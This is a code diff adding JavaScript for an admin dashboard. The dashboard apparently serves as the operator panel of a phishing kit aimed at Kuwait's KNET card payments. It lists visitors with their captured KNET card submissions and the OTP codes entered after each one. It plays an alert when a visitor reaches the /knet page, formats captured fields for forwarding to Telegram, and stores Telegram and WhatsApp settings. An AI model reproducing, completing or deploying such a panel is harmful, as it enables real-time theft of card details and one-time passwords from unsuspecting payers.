+        if (!Array.isArray(submissions) || submissions.length === 0) {
+          submissionsBodyEl.innerHTML = "<tr id=\"no-submissions-row\"><td colspan=\"1\" class=\"text-secondary\">No submissions for this visitor yet.</td></tr>";
+          return;
+        }
+        var sortedSubmissions = sortSubmissionsNewestFirst(submissions);
+        var knetSubmissions = sortedSubmissions.filter(isKnetSubmission);
+        if (!knetSubmissions.length) {
+          submissionsBodyEl.innerHTML = "<tr id=\"submissions-info-row\"><td colspan=\"1\" class=\"submission-empty-state\">لا توجد معلومات KNET مدخلة</td></tr>";
+          return;
+        }
+
+        var submissionColumns = getSubmissionColumns(knetSubmissions);
+        var columnCount = Math.max(submissionColumns.length, 1);
+        if (submissionsHeadEl) {
+          submissionsHeadEl.innerHTML = renderSubmissionGroupHead(submissionColumns);
+        }
+        submissionsBodyEl.innerHTML = knetSubmissions.map(function (submission) {
+          var otpSubmissions = getOtpSubmissionsForKnetSubmission(submission, sortedSubmissions);
+          return (
+            renderSubmissionRow(submission, submissionColumns, columnCount) +
+            renderOtpSubmissionDetailsRow(otpSubmissions, columnCount)
+          );
+        }).join("");
+      }
+
+      function updateSubmissionsHeader(totalVisible) {
+        updateSubmissionsDetailsButton();
+      }
+
+      function applyVisitorSelection() {
+        var visibleSubmissions = allSubmissions;
+        if (selectedVisitorId) {
+          visibleSubmissions = allSubmissions.filter(function (submission) {
+            return (submission.visitor_id || "") === selectedVisitorId;
+          });
+        }
+        persistSelectedVisitorId();
+        renderSubmissions(visibleSubmissions);
+        updateSubmissionsHeader(visibleSubmissions.length);
+        setVisitors(allVisitors, totalVisitorsCount);
+      }
+
+      function getVisitorArchiveRevealWidth(rowEl) {
+        if (!rowEl) {
+          return 0;
+        }
+        return rowEl.getBoundingClientRect().width * VISITOR_ARCHIVE_REVEAL_RATIO;
+      }
+
+      function getVisitorArchiveSettleThreshold(rowEl) {
+        if (!rowEl) {
+          return 0;
+        }
+        return rowEl.getBoundingClientRect().width * VISITOR_ARCHIVE_SETTLE_THRESHOLD_RATIO;
+      }
+
+      function setVisitorSwipeOffset(rowEl, offset) {
+        if (!rowEl) {
+          return;
+        }
+        var revealWidth = getVisitorArchiveRevealWidth(rowEl);
+        var safeOffset = Math.max(0, Math.min(revealWidth, offset || 0));
+        rowEl.style.setProperty("--visitor-swipe-offset", String(safeOffset) + "px");
+        if (safeOffset > 0) {
+          rowEl.classList.add("is-swiping");
+        } else {
+          rowEl.classList.remove("is-swiping");
+        }
+        rowEl.classList.toggle("is-revealed", revealWidth > 0 && safeOffset >= revealWidth - 1);
+      }
+
+      function resetVisitorSwipe(rowEl) {
+        if (!rowEl) {
+          return;
+        }
+        rowEl.classList.remove("is-swiping", "is-archiving", "is-flying", "is-collapsing", "is-revealed");
+        rowEl.style.removeProperty("--visitor-swipe-offset");
+      }
+
+      function settleVisitorSwipe(rowEl) {
+        if (!rowEl) {
+          return;
+        }
+        rowEl.classList.remove("is-swiping");
+        setVisitorSwipeOffset(rowEl, getVisitorArchiveRevealWidth(rowEl));
+      }
+
+      function resetOtherVisitorSwipes(exceptRowEl) {
+        if (!visitorsBodyEl) {
+          return;
+        }
+        Array.prototype.forEach.call(
+          visitorsBodyEl.querySelectorAll(".visitor-row.is-revealed, .visitor-row.is-swiping"),
+          function (rowEl) {
+            if (rowEl !== exceptRowEl && !rowEl.classList.contains("is-archiving")) {
+              resetVisitorSwipe(rowEl);
+            }
+          }
+        );
+      }
+
+      function stopVisitorSwipe() {
+        if (!visitorSwipeState) {
+          return null;
+        }
+        var state = visitorSwipeState;
+        visitorSwipeState = null;
+        window.removeEventListener("pointermove", onVisitorPointerMove);
+        window.removeEventListener("pointerup", onVisitorPointerUp);
+        window.removeEventListener("pointercancel", onVisitorPointerCancel);
+        return state;
+      }
+
+      function clearVisitorWheelState(shouldResetRow) {
+        if (!visitorWheelState) {
+          return null;
+        }
+        var state = visitorWheelState;
+        visitorWheelState = null;
+        if (state.resetTimer) {
+          window.clearTimeout(state.resetTimer);
+        }
+        if (shouldResetRow && state.rowEl && !state.rowEl.classList.contains("is-archiving")) {
+          resetVisitorSwipe(state.rowEl);
+        }
+        return state;
+      }
+
+      function scheduleVisitorWheelReset() {
+        if (!visitorWheelState) {
+          return;
+        }
+        if (visitorWheelState.resetTimer) {
+          window.clearTimeout(visitorWheelState.resetTimer);
+        }
+        visitorWheelState.resetTimer = window.setTimeout(function () {
+          var state = clearVisitorWheelState(false);
+          if (!state || !state.rowEl || state.rowEl.classList.contains("is-archiving")) {
+            return;
+          }
+          if (state.currentOffset >= state.settleThreshold) {
+            settleVisitorSwipe(state.rowEl);
+            return;
+          }
+          resetVisitorSwipe(state.rowEl);
+        }, VISITOR_WHEEL_RESET_DELAY_MS);
+      }
+
+      function archiveVisitorRow(rowEl, buttonEl) {
+        if (!rowEl || !buttonEl) {
+          return;
+        }
+        clearVisitorWheelState(false);
+        var visitorId = buttonEl.getAttribute("data-visitor-id") || "";
+        if (!visitorId) {
+          resetVisitorSwipe(rowEl);
+          return;
+        }
+        buttonEl.dataset.ignoreClickUntil = String(Date.now() + 500);
+        rowEl.classList.remove("is-swiping");
+        rowEl.classList.add("is-archiving");
+        requestAnimationFrame(function () {
+          rowEl.classList.add("is-flying");
+        });
+        window.fetch("/admin/visitors/" + encodeURIComponent(visitorId) + "/archive", {
+          method: "POST",
+          headers: {
+            "x-csrf-token": csrfToken
+          },
+          credentials: "same-origin"
+        })
+          .then(function (response) {
+            if (!response.ok) {
+              throw new Error("archive_failed");
+            }
+            return response.json();
+          })
+          .then(function (data) {
+            if (selectedVisitorId === visitorId) {
+              selectedVisitorId = null;
+              applyVisitorSelection();
+            }
+            window.setTimeout(function () {
+              rowEl.classList.add("is-collapsing");
+            }, VISITOR_ARCHIVE_COLLAPSE_DELAY_MS);
+            window.setTimeout(function () {
+              if (Array.isArray(data.recent_visitors)) {
+                setVisitors(data.recent_visitors, data.total_visitors);
+              }
+            }, VISITOR_ARCHIVE_FLY_DURATION_MS);
+          })
+          .catch(function () {
+            resetVisitorSwipe(rowEl);
+            window.alert("Unable to archive this visitor right now.");
+          });
+      }
+
+      function toggleVisitorBlock(rowEl, buttonEl) {
+        if (!rowEl || !buttonEl) {
+          return;
+        }
+        var visitorId = buttonEl.getAttribute("data-visitor-id") || "";
+        if (!visitorId) {
+          return;
+        }
+        if (buttonEl.disabled) {
+          return;
+        }
+        buttonEl.disabled = true;
+        window.fetch("/admin/visitors/" + encodeURIComponent(visitorId) + "/block", {
+          method: "POST",
+          headers: {
+            "x-csrf-token": csrfToken
+          },
+          credentials: "same-origin"
+        })
+          .then(function (response) {
+            if (!response.ok) {
+              throw new Error("block_failed");
+            }
+            return response.json();
+          })
+          .then(function (data) {
+            if (Array.isArray(data.recent_visitors)) {
+              setVisitors(data.recent_visitors, data.total_visitors);
+              if (selectedVisitorId === visitorId) {
+                applyVisitorSelection();
+              }
+            }
+          })
+          .catch(function () {
+            window.alert("Unable to update this visitor right now.");
+          })
+          .finally(function () {
+            buttonEl.disabled = false;
+          });
+      }
+
+      function onVisitorPointerMove(event) {
+        if (!visitorSwipeState || event.pointerId !== visitorSwipeState.pointerId) {
+          return;
+        }
+        var deltaX = event.clientX - visitorSwipeState.startX;
+        var deltaY = event.clientY - visitorSwipeState.startY;
+        if (!visitorSwipeState.axis) {
+          if (
+            Math.abs(deltaX) < SWIPE_ACTIVATE_DISTANCE &&
+            Math.abs(deltaY) < SWIPE_ACTIVATE_DISTANCE
+          ) {
+            return;
+          }
+          visitorSwipeState.axis = Math.abs(deltaX) >= Math.abs(deltaY) ? "x" : "y";
+          if (visitorSwipeState.axis !== "x") {
+            resetVisitorSwipe(visitorSwipeState.rowEl);
+            stopVisitorSwipe();
+            return;
+          }
+        }
+        if (visitorSwipeState.axis !== "x") {
+          return;
+        }
+        event.preventDefault();
+        visitorSwipeState.currentOffset = Math.max(0, deltaX);
+        visitorSwipeState.didSwipe = visitorSwipeState.currentOffset > 0;
+        setVisitorSwipeOffset(visitorSwipeState.rowEl, visitorSwipeState.currentOffset);
+      }
+
+      function onVisitorPointerUp(event) {
+        if (!visitorSwipeState || event.pointerId !== visitorSwipeState.pointerId) {
+          return;
+        }
+        var state = stopVisitorSwipe();
+        if (!state) {
+          return;
+        }
+        if (state.didSwipe) {
+          state.buttonEl.dataset.ignoreClickUntil = String(Date.now() + 250);
+        }
+        if (state.currentOffset >= state.settleThreshold) {
+          settleVisitorSwipe(state.rowEl);
+          return;
+        }
+        resetVisitorSwipe(state.rowEl);
+      }
+
+      function onVisitorPointerCancel(event) {
+        if (!visitorSwipeState || event.pointerId !== visitorSwipeState.pointerId) {
+          return;
+        }
+        var state = stopVisitorSwipe();
+        if (state) {
+          resetVisitorSwipe(state.rowEl);
+        }
+      }
+
+      function handleVisitorWheelGesture(event, rowEl, buttonEl) {
+        if (!rowEl || !buttonEl || rowEl.classList.contains("is-archiving")) {
+          return;
+        }
+        if (Math.abs(event.deltaX) < 0.5 || Math.abs(event.deltaX) < Math.abs(event.deltaY)) {
+          return;
+        }
+        event.preventDefault();
+        if (!visitorWheelState || visitorWheelState.rowEl !== rowEl) {
+          clearVisitorWheelState(true);
+          resetOtherVisitorSwipes(rowEl);
+          visitorWheelState = {
+            rowEl: rowEl,
+            buttonEl: buttonEl,
+            currentOffset: 0,
+            settleThreshold: getVisitorArchiveSettleThreshold(rowEl),
+            resetTimer: null
+          };
+        }
+        visitorWheelState.currentOffset = Math.max(0, visitorWheelState.currentOffset - event.deltaX);
+        setVisitorSwipeOffset(rowEl, visitorWheelState.currentOffset);
+        scheduleVisitorWheelReset();
+      }
+
+      function bindVisitorButtons() {
+        if (!visitorsBodyEl) {
+          return;
+        }
+        Array.prototype.forEach.call(
+          visitorsBodyEl.querySelectorAll(".visitor-option"),
+          function (buttonEl) {
+            var rowEl = buttonEl.closest(".visitor-row");
+            buttonEl.addEventListener("click", function (event) {
+              if (event.target.closest(".visitor-location-button") || event.target.closest(".visitor-block-toggle")) {
+                return;
+              }
+              var ignoreClickUntil = Number.parseInt(buttonEl.dataset.ignoreClickUntil || "0", 10);
+              if (ignoreClickUntil > Date.now()) {
+                event.preventDefault();
+                return;
+              }
+              if (rowEl && rowEl.classList.contains("is-revealed")) {
+                event.preventDefault();
+                return;
+              }
+              var visitorId = buttonEl.getAttribute("data-visitor-id") || "";
+              if (!visitorId || selectedVisitorId === visitorId) {
+                return;
+              }
+              selectedVisitorId = visitorId;
+              markVisitorKnetSeen(visitorId);
+              applyVisitorSelection();
+            });
+            buttonEl.addEventListener("keydown", function (event) {
+              if (event.key !== "Enter" && event.key !== " ") {
+                return;
+              }
+              event.preventDefault();
+              buttonEl.click();
+            });
+            buttonEl.addEventListener("pointerdown", function (event) {
+              if (event.target.closest(".visitor-location-button") || event.target.closest(".visitor-block-toggle")) {
+                return;
+              }
+              if (!rowEl || rowEl.classList.contains("is-archiving")) {
+                return;
+              }
+              clearVisitorWheelState(true);
+              if (event.pointerType === "mouse" && event.button !== 0) {
+                return;
+              }
+              resetOtherVisitorSwipes(rowEl);
+              visitorSwipeState = {
+                pointerId: event.pointerId,
+                startX: event.clientX,
+                startY: event.clientY,
+                currentOffset: 0,
+                axis: null,
+                didSwipe: false,
+                settleThreshold: getVisitorArchiveSettleThreshold(rowEl),
+                rowEl: rowEl,
+                buttonEl: buttonEl
+              };
+              window.addEventListener("pointermove", onVisitorPointerMove, { passive: false });
+              window.addEventListener("pointerup", onVisitorPointerUp);
+              window.addEventListener("pointercancel", onVisitorPointerCancel);
+            });
+            buttonEl.addEventListener("wheel", function (event) {
+              handleVisitorWheelGesture(event, rowEl, buttonEl);
+            }, { passive: false });
+            buttonEl.addEventListener("mouseleave", function () {
+              if (visitorWheelState && visitorWheelState.rowEl === rowEl) {
+                scheduleVisitorWheelReset();
+              }
+            });
+          }
+        );
+        Array.prototype.forEach.call(
+          visitorsBodyEl.querySelectorAll(".visitor-archive-action"),
+          function (buttonEl) {
+            var rowEl = buttonEl.closest(".visitor-row");
+            buttonEl.addEventListener("click", function (event) {
+              event.preventDefault();
+              event.stopPropagation();
+              archiveVisitorRow(rowEl, buttonEl);
+            });
+          }
+        );
+        Array.prototype.forEach.call(
+          visitorsBodyEl.querySelectorAll(".visitor-block-toggle"),
+          function (buttonEl) {
+            var rowEl = buttonEl.closest(".visitor-row");
+            buttonEl.addEventListener("click", function (event) {
+              event.preventDefault();
+              event.stopPropagation();
+              toggleVisitorBlock(rowEl, buttonEl);
+            });
+          }
+        );
+        Array.prototype.forEach.call(
+          visitorsBodyEl.querySelectorAll(".visitor-location-button"),
+          function (buttonEl) {
+            buttonEl.addEventListener("click", function (event) {
+              event.preventDefault();
+              event.stopPropagation();
+              openVisitorPagesModal(
+                buttonEl.getAttribute("data-visitor-id") || "",
+                buttonEl.getAttribute("data-page-path") || "",
+                buttonEl.getAttribute("data-page-title") || ""
+              );
+            });
+          }
+        );
+      }
+
+      function setVisitors(visitors, totalVisitors) {
+        if (!visitorsBodyEl) {
+          return;
+        }
+        var numericTotal = typeof totalVisitors === "number" ? totalVisitors : 0;
+        totalVisitorsCount = numericTotal;
+        if (visitorsTotalEl) {
+          visitorsTotalEl.textContent = String(numericTotal);
+        }
+        if (!Array.isArray(visitors)) {
+          return;
+        }
+        notifyKnetPageTransitions(visitors);
+        allVisitors = visitors.slice(0);
+        var activeVisitorIds = {};
+        allVisitors.forEach(function (visitor) {
+          var visitorId = String(visitor && visitor.id || "");
+          if (visitorId) {
+            activeVisitorIds[visitorId] = true;
+          }
+        });
+        Object.keys(seenSubmissionState).forEach(function (visitorId) {
+          if (!activeVisitorIds[visitorId]) {
+            delete seenSubmissionState[visitorId];
+          }
+        });
+        Object.keys(seenKnetState).forEach(function (visitorId) {
+          if (!activeVisitorIds[visitorId]) {
+            delete seenKnetState[visitorId];
+          }
+        });
+        persistSeenSubmissionState();
+        persistSeenKnetState();
+        syncSelectedVisitorWithAvailableVisitors();
+        var visibleVisitors = showKnetVisitorsOnly
+          ? allVisitors.filter(function (visitor) {
+              return visitorHasKnetSubmission(String(visitor && visitor.id || ""));
+            })
+          : allVisitors;
+        if (
+          showKnetVisitorsOnly &&
+          selectedVisitorId &&
+          !visibleVisitors.some(function (visitor) {
+            return String(visitor && visitor.id || "") === String(selectedVisitorId);
+          })
+        ) {
+          selectedVisitorId = null;
+          persistSelectedVisitorId();
+        }
+        updateSubmissionsDetailsButton();
+        if (visibleVisitors.length === 0) {
+          visitorsBodyEl.innerHTML = "<tr id=\"no-visitors-row\"><td class=\"text-secondary\">No visitors tracked yet.</td></tr>";
+          return;
+        }
+        visitorsBodyEl.innerHTML = visibleVisitors.map(renderVisitorRow).join("");
+        bindVisitorButtons();
+        updateSubmissionsDetailsButton();
+        if (submissionsDetailsModalEl && !submissionsDetailsModalEl.hidden && selectedVisitorId) {
+          renderSubmissionsDetails(getVisitorCartItems(selectedVisitorId));
+          markVisitorSubmissionsSeen(selectedVisitorId);
+          updateSubmissionsDetailsButton();
+        }
+      }
+
+      function prependSubmission(submission) {
+        allSubmissions = [submission].concat(
+          allSubmissions.filter(function (item) {
+            return (item.id || "") !== (submission.id || "");
+          })
+        );
+        if (
+          submissionsDetailsModalEl &&
+          !submissionsDetailsModalEl.hidden &&
+          selectedVisitorId &&
+          String(submission.visitor_id || "") === String(selectedVisitorId)
+        ) {
+          renderSubmissionsDetails(getVisitorCartItems(selectedVisitorId));
+          markVisitorSubmissionsSeen(selectedVisitorId);
+        }
+        applyVisitorSelection();
+      }
+
+      function unlockKnetAlertAudio() {
+        try {
+          knetAlertAudioEl.muted = true;
+          knetAlertAudioEl.currentTime = 0;
+          var unlockPromise = knetAlertAudioEl.play();
+          Promise.resolve(unlockPromise).then(function () {
+            knetAlertAudioEl.pause();
+            knetAlertAudioEl.currentTime = 0;
+            knetAlertAudioEl.muted = false;
+            knetAlertAudioUnlocked = true;
+            unbindKnetAlertUnlockListeners();
+            if (pendingKnetAlertPlays > 0) {
+              pendingKnetAlertPlays = 0;
+              playKnetAlertSound();
+            }
+          }).catch(function () {
+          });
+        } catch (error) {
+        }
+      }
+
+      function bindKnetAlertUnlockListeners() {
+        if (knetAlertUnlockListenersBound) {
+          return;
+        }
+        knetAlertUnlockListenersBound = true;
+        ["pointerdown", "mousedown", "click", "keydown", "touchstart", "wheel", "focusin"].forEach(function (eventName) {
+          document.addEventListener(eventName, unlockKnetAlertAudio, { passive: true });
+        });
+      }
+
+      function unbindKnetAlertUnlockListeners() {
+        if (!knetAlertUnlockListenersBound) {
+          return;
+        }
+        knetAlertUnlockListenersBound = false;
+        ["pointerdown", "mousedown", "click", "keydown", "touchstart", "wheel", "focusin"].forEach(function (eventName) {
+          document.removeEventListener(eventName, unlockKnetAlertAudio, { passive: true });
+        });
+      }
+
+      function playKnetAlertSound() {
+        try {
+          if (!knetAlertAudioUnlocked) {
+            pendingKnetAlertPlays += 1;
+            bindKnetAlertUnlockListeners();
+            unlockKnetAlertAudio();
+            return;
+          }
+          knetAlertAudioEl.pause();
+          knetAlertAudioEl.currentTime = 0;
+          knetAlertAudioEl.muted = false;
+          knetAlertAudioEl.play().catch(function () {
+          });
+        } catch (error) {
+        }
+      }
+
+      function notifyKnetPageTransitions(nextVisitors) {
+        if (!Array.isArray(nextVisitors)) {
+          return;
+        }
+        var nextPageMap = {};
+        var shouldPlay = false;
+        nextVisitors.forEach(function (visitor) {
+          var visitorId = String(visitor && visitor.id || "");
+          if (!visitorId) {
+            return;
+          }
+          var nextPath = String(visitor.current_page_path || "");
+          var previousPath = String(visitorCurrentPageById[visitorId] || "");
+          nextPageMap[visitorId] = nextPath;
+          if (nextPath === "/knet" && previousPath !== "/knet") {
+            shouldPlay = true;
+          }
+        });
+        visitorCurrentPageById = nextPageMap;
+        if (shouldPlay) {
+          playKnetAlertSound();
+        }
+      }
+
+      function setSubmissions(submissions) {
+        if (!Array.isArray(submissions)) {
+          return;
+        }
+        allSubmissions = submissions.slice(0);
+        if (submissionsDetailsModalEl && !submissionsDetailsModalEl.hidden && selectedVisitorId) {
+          renderSubmissionsDetails(getVisitorCartItems(selectedVisitorId));
+          markVisitorSubmissionsSeen(selectedVisitorId);
+        }
+        applyVisitorSelection();
+      }
+
+      function buildTelegramSubmissionFields(submission) {
+        if (!submission || !Array.isArray(submission.fields)) {
+          return [];
+        }
+        return submission.fields
+          .map(function (field) {
+            var fieldName = String(field.label || field.name || "").trim();
+            var fieldValue = String(field.value || "").trim();
+            if (!fieldName) {
+              return null;
+            }
+            return {
+              name: fieldName,
+              value: fieldValue
+            };
+          })
+          .filter(Boolean);
+      }
+
+      function getGridMaxVisitorsWidth() {
+        if (!dashboardGridEl) {
+          return MIN_VISITORS_WIDTH;
+        }
+        var computedStyles = getComputedStyle(dashboardGridEl);
+        var columnGap = Number.parseFloat(computedStyles.columnGap || "0") || 0;
+        return Math.max(
+          MIN_VISITORS_WIDTH,
+          dashboardGridEl.clientWidth - MIN_SUBMISSIONS_WIDTH - columnGap
+        );
+      }
+
+      function getGridMaxMobileVisitorsHeight() {
+        if (!dashboardGridEl) {
+          return MIN_MOBILE_VISITORS_HEIGHT;
+        }
+        var computedStyles = getComputedStyle(dashboardGridEl);
+        var rowGap = Number.parseFloat(computedStyles.rowGap || computedStyles.gap || "0") || 0;
+        return Math.max(
+          MIN_MOBILE_VISITORS_HEIGHT,
+          dashboardGridEl.clientHeight - MIN_SUBMISSIONS_HEIGHT - rowGap
+        );
+      }
+
+      function clampVisitorsWidth(width) {
+        var numericWidth = typeof width === "number" ? width : Number.parseFloat(String(width));
+        if (!Number.isFinite(numericWidth)) {
+          return null;
+        }
+        return Math.min(getGridMaxVisitorsWidth(), Math.max(MIN_VISITORS_WIDTH, numericWidth));
+      }
+
+      function setVisitorsPanelWidth(width, persist) {
+        if (!dashboardGridEl) {
+          return;
+        }
+        var clampedWidth = clampVisitorsWidth(width);
+        if (clampedWidth === null) {
+          dashboardGridEl.style.removeProperty("--visitors-panel-width");
+          return;
+        }
+        dashboardGridEl.style.setProperty("--visitors-panel-width", String(clampedWidth) + "px");
+        if (persist) {
+          try {
+            localStorage.setItem(PANEL_WIDTH_STORAGE_KEY, String(clampedWidth));
+          } catch (error) {
+          }
+        }
+      }
+
+      function clampMobileVisitorsHeight(height) {
+        var numericHeight = typeof height === "number" ? height : Number.parseFloat(String(height));
+        if (!Number.isFinite(numericHeight)) {
+          return null;
+        }
+        return Math.min(
+          getGridMaxMobileVisitorsHeight(),
+          Math.max(MIN_MOBILE_VISITORS_HEIGHT, numericHeight)
+        );
+      }
+
+      function setMobileVisitorsHeight(height, persist) {
+        if (!dashboardGridEl) {
+          return;
+        }
+        var clampedHeight = clampMobileVisitorsHeight(height);
+        if (clampedHeight === null) {
+          dashboardGridEl.style.removeProperty("--mobile-visitors-panel-height");
+          return;
+        }
+        dashboardGridEl.style.setProperty("--mobile-visitors-panel-height", String(clampedHeight) + "px");
+        if (persist) {
+          try {
+            localStorage.setItem(MOBILE_VISITORS_HEIGHT_STORAGE_KEY, String(clampedHeight));
+          } catch (error) {
+          }
+        }
+      }
+
+      function applyStoredVisitorsWidth() {
+        if (!dashboardGridEl || window.matchMedia("(max-width: 900px)").matches) {
+          return;
+        }
+        try {
+          var storedWidth = localStorage.getItem(PANEL_WIDTH_STORAGE_KEY);
+          if (storedWidth) {
+            setVisitorsPanelWidth(storedWidth, false);
+          }
+        } catch (error) {
+        }
+      }
+
+      function applyStoredMobileVisitorsHeight() {
+        if (!dashboardGridEl || !window.matchMedia("(max-width: 900px)").matches) {
+          return;
+        }
+        try {
+          var storedHeight = localStorage.getItem(MOBILE_VISITORS_HEIGHT_STORAGE_KEY);
+          if (storedHeight) {
+            setMobileVisitorsHeight(storedHeight, false);
+          }
+        } catch (error) {
+        }
+      }
+
+      function bindDashboardResizer() {
+        if (!dashboardGridEl || panelResizerEls.length === 0) {
+          return;
+        }
+        var activeResizerEl = null;
+        var pointerOffset = 0;
+
+        function onPointerMove(event) {
+          if (!activeResizerEl) {
+            return;
+          }
+          var edge = activeResizerEl.dataset.resizeEdge || "";
+          var bounds = dashboardGridEl.getBoundingClientRect();
+          if (edge === "top") {
+            setMobileVisitorsHeight((event.clientY - bounds.top) + pointerOffset, false);
+            return;
+          }
+          setVisitorsPanelWidth((event.clientX - bounds.left) + pointerOffset, false);
+        }
+
+        function stopResize() {
+          document.body.classList.remove("is-resizing-dashboard");
+          var edge = activeResizerEl ? activeResizerEl.dataset.resizeEdge || "" : "";
+          if (activeResizerEl) {
+            activeResizerEl.classList.remove("is-active");
+            activeResizerEl = null;
+          }
+          window.removeEventListener("pointermove", onPointerMove);
+          window.removeEventListener("pointerup", stopResize);
+          window.removeEventListener("pointercancel", stopResize);
+          try {
+            if (edge === "top") {
+              var resolvedHeight = getComputedStyle(dashboardGridEl)
+                .getPropertyValue("--mobile-visitors-panel-height")
+                .trim();
+              if (resolvedHeight) {
+                localStorage.setItem(MOBILE_VISITORS_HEIGHT_STORAGE_KEY, resolvedHeight.replace("px", ""));
+              }
+            } else {
+              var resolvedWidth = getComputedStyle(dashboardGridEl)
+                .getPropertyValue("--visitors-panel-width")
+                .trim();
+              if (resolvedWidth) {
+                localStorage.setItem(PANEL_WIDTH_STORAGE_KEY, resolvedWidth.replace("px", ""));
+              }
+            }
+          } catch (error) {
+          }
+        }
+
+        panelResizerEls.forEach(function (resizerEl) {
+          resizerEl.addEventListener("pointerdown", function (event) {
+            var edge = resizerEl.dataset.resizeEdge || "";
+            var isMobileLayout = window.matchMedia("(max-width: 900px)").matches;
+            if (edge === "top" && !isMobileLayout) {
+              return;
+            }
+            if (edge !== "top" && isMobileLayout) {
+              return;
+            }
+            event.preventDefault();
+            activeResizerEl = resizerEl;
+            activeResizerEl.classList.add("is-active");
+            var bounds = dashboardGridEl.getBoundingClientRect();
+            if (edge === "top") {
+              var currentHeight = clampMobileVisitorsHeight(
+                getComputedStyle(dashboardGridEl).getPropertyValue("--mobile-visitors-panel-height")
+              );
+              if (currentHeight === null) {
+                currentHeight = clampMobileVisitorsHeight(
+                  dashboardGridEl.querySelector(".visitors-panel").getBoundingClientRect().height
+                );
+              }
+              pointerOffset = currentHeight - (event.clientY - bounds.top);
+            } else {
+              var currentWidth = clampVisitorsWidth(
+                getComputedStyle(dashboardGridEl).getPropertyValue("--visitors-panel-width")
+              );
+              if (currentWidth === null) {
+                currentWidth = clampVisitorsWidth(
+                  dashboardGridEl.querySelector(".visitors-panel").getBoundingClientRect().width
+                );
+              }
+              pointerOffset = currentWidth - (event.clientX - bounds.left);
+            }
+            if (typeof resizerEl.setPointerCapture === "function") {
+              try {
+                resizerEl.setPointerCapture(event.pointerId);
+              } catch (error) {
+              }
+            }
+            document.body.classList.add("is-resizing-dashboard");
+            onPointerMove(event);
+            window.addEventListener("pointermove", onPointerMove);
+            window.addEventListener("pointerup", stopResize);
+            window.addEventListener("pointercancel", stopResize);
+          });
+        });
+
+        window.addEventListener("resize", function () {
+          if (window.matchMedia("(max-width: 900px)").matches) {
+            dashboardGridEl.style.removeProperty("--visitors-panel-width");
+            applyStoredMobileVisitorsHeight();
+            return;
+          }
+          dashboardGridEl.style.removeProperty("--mobile-visitors-panel-height");
+          applyStoredVisitorsWidth();
+        });
+      }
+
+      function openSettingsModal() {
+        if (!settingsModalEl) {
+          return;
+        }
+        settingsModalEl.hidden = false;
+        settingsModalEl.setAttribute("aria-hidden", "false");
+        document.body.classList.add("is-admin-modal-open");
+      }
+
+      function closeSettingsModal() {
+        if (!settingsModalEl) {
+          return;
+        }
+        settingsModalEl.hidden = true;
+        settingsModalEl.setAttribute("aria-hidden", "true");
+        if (!telegramConfirmModalEl || telegramConfirmModalEl.hidden) {
+          document.body.classList.remove("is-admin-modal-open");
+        }
+      }
+
+      function setTelegramFeedback(message, variant) {
+        if (!telegramApiTokenFeedbackEl) {
+          return;
+        }
+        telegramApiTokenFeedbackEl.textContent = message || "";
+        telegramApiTokenFeedbackEl.classList.remove("is-loading", "is-error");
+        if (!message) {
+          telegramApiTokenFeedbackEl.hidden = true;
+          return;
+        }
+        telegramApiTokenFeedbackEl.hidden = false;
+        if (variant) {
+          telegramApiTokenFeedbackEl.classList.add("is-" + variant);
+        }
+      }
+
+      function hasStoredTelegramSettings() {
+        return Boolean(
+          storedTelegramSettings &&
+          storedTelegramSettings.api_token &&
+          storedTelegramSettings.chat_id
+        );
+      }
+
+      function setTelegramChatId(chatId) {
+        if (!telegramChatIdFieldEl || !telegramChatIdInputEl) {
+          return;
+        }
+        if (!chatId) {
+          telegramChatIdInputEl.value = "";
+          telegramChatIdFieldEl.hidden = true;
+          return;
+        }
+        telegramChatIdInputEl.value = String(chatId);
+        telegramChatIdFieldEl.hidden = false;
+      }
+
+      function setTelegramInputEditing(isEditing) {
+        telegramIsEditing = Boolean(isEditing);
+        if (!telegramApiTokenInputEl) {
+          return;
+        }
+        telegramApiTokenInputEl.disabled = hasStoredTelegramSettings() && !telegramIsEditing;
+        if (telegramTokenActionsEl) {
+          telegramTokenActionsEl.hidden = !hasStoredTelegramSettings() || telegramIsEditing;
+        }
+      }
+
+      function syncTelegramStoredState() {
+        if (telegramTokenActionsEl) {
+          telegramTokenActionsEl.hidden = !hasStoredTelegramSettings() || telegramIsEditing;
+        }
+        if (telegramApiTokenInputEl) {
+          telegramApiTokenInputEl.disabled = hasStoredTelegramSettings() && !telegramIsEditing;
+        }
+      }
+
+      function applyStoredTelegramSettings(nextSettings, preserveInput) {
+        storedTelegramSettings = {
+          api_token: String(nextSettings && nextSettings.api_token || "").trim(),
+          chat_id: String(nextSettings && nextSettings.chat_id || "").trim()
+        };
+        telegramIsEditing = false;
+        syncTelegramStoredState();
+        if (telegramApiTokenInputEl && !preserveInput) {
+          telegramApiTokenInputEl.value = storedTelegramSettings.api_token;
+        }
+        setTelegramChatId(storedTelegramSettings.chat_id);
+        setTelegramFeedback("", "");
+      }
+
+      function setWhatsappFeedback(message, variant) {
+        if (!whatsappFeedbackEl) {
+          return;
+        }
+        whatsappFeedbackEl.textContent = message || "";
+        whatsappFeedbackEl.classList.remove("is-loading", "is-error");
+        if (!message) {
+          whatsappFeedbackEl.hidden = true;
+          return;
+        }
+        whatsappFeedbackEl.hidden = false;
+        if (variant) {
+          whatsappFeedbackEl.classList.add("is-" + variant);
+        }
+      }
+
+      function hasStoredWhatsappSetting() {
+        return Boolean(
+          storedWhatsappSettings &&
+          String(storedWhatsappSettings.value || "").trim()
+        );
+      }
+
+      function syncWhatsappStoredState() {
+        if (whatsappActionsEl) {
+          whatsappActionsEl.hidden = !hasStoredWhatsappSetting() || whatsappIsEditing;
+        }
+        if (whatsappInputEl) {
+          whatsappInputEl.disabled = hasStoredWhatsappSetting() && !whatsappIsEditing;
+        }
+      }
+
+      function setWhatsappInputEditing(isEditing) {
+        whatsappIsEditing = Boolean(isEditing);
+        syncWhatsappStoredState();
+      }
+
+      function applyStoredWhatsappSettings(nextSettings, preserveInput) {
+        storedWhatsappSettings = {
+          value: String(nextSettings && nextSettings.value || "").trim()
+        };
+        whatsappIsEditing = false;
+        syncWhatsappStoredState();
+        if (whatsappInputEl && !preserveInput) {
+          whatsappInputEl.value = storedWhatsappSettings.value;
+        }
+        setWhatsappFeedback(
+          storedWhatsappSettings.value ? "WhatsApp number saved in dashboard settings." : "",
+          ""
+        );
+      }
+
+      function setPaymentSettingsFeedback(message, variant) {
+        if (!paymentSettingsFeedbackEl) {
+          return;
+        }
+        paymentSettingsFeedbackEl.textContent = message || "";
+        paymentSettingsFeedbackEl.classList.remove("is-loading", "is-error");
+        if (!message) {
+          paymentSettingsFeedbackEl.hidden = true;
+          return;
+        }
